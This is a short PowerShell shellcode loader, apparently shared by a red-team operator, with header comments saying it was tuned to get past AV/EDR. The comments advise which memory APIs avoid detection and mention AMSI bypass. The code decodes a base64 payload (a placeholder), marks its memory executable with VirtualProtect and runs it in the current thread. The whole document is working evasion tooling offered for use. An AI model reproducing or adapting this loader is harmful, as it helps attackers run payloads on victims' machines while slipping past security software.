# Very simple loader that proved effective at getting past AV/EDR (At the time)
#
# The loader was debugged until it was found what methods of loading SC were setting it off.
# From there this approach simplified what was in use by finding alternatives.
# Nothing fancy with syscalls and assembly just the use of less flagged techniques.
# I would stay away from things like meterpreter unless your going to perform some serious evasion it will most likely get caught in memory.
# Then again theres always amsii bypass. I've found the VirtualProtect a lot more accepted then VirutalAlloc or VIrutalAllocEx, etc.
# From memory it would sometimes still alert but allow the injection to take place.
#
#  - Liquidsky @ Specialized Security Services, Inc. (S3)
#

# Define the VirtualProtect function to change memory permissions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

# Base64-encoded shellcode string
$base64Shellcode = "INSERT-BASE64-HERE"

# Decode Base64 to a byte array
$bytes = [System.Convert]::FromBase64String($base64Shellcode)

# Allocate memory for the shellcode and copy the decoded bytes to it
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)

# Change memory protection to executable (0x40 means PAGE_EXECUTE_READWRITE)
$oldProtect = 0
[Kernel32]::VirtualProtect($ptr, [uint32]$bytes.Length, 0x40, [ref] $oldProtect) | Out-Null

# Create a delegate to run the shellcode
$executeShellcode = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action])

# Directly invoke the delegate to execute the shellcode in the current thread
$executeShellcode.Invoke()
